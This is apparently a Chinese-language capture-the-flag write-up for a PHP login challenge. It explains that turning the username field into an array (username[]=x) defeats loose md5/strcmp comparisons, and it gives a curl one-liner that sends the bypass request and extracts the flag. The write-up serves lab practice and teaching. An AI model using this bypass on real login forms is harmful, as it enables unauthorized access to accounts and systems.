## 题解

### 入口与指纹

`Apache/2.4.25` + `PHP/5.6.40`，标题 `AUTH 02`，表单 POST `index.php`，字段 `username`、`password`、`login`。

### 关键观察

- 普通口令、SQLi、magic hash 全部返回 `Incorrect`。
- `username[]=x&password=x`（把用户名变成数组）直接返回 flag。

原因是登录逻辑对用户名做了类似 `md5($username)` 或 `strcmp`/`==` 的比较，数组参数让
函数返回 `NULL`/触发宽松比较，从而通过。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST -d 'username[]=x&password=x' "http://$T/index.php" \
| grep -o 'flag{[^}]*}'
```

### flag 位置

登录成功页面的正文。

## 复盘

- PHP 应用里把某个字段改成数组（`name[]=x`）是最便宜的绕过尝试，往往一个请求就出结果。
- 与 060 的 `password[]`、055 的 `password[]` 是同一类缺陷的不同落点。
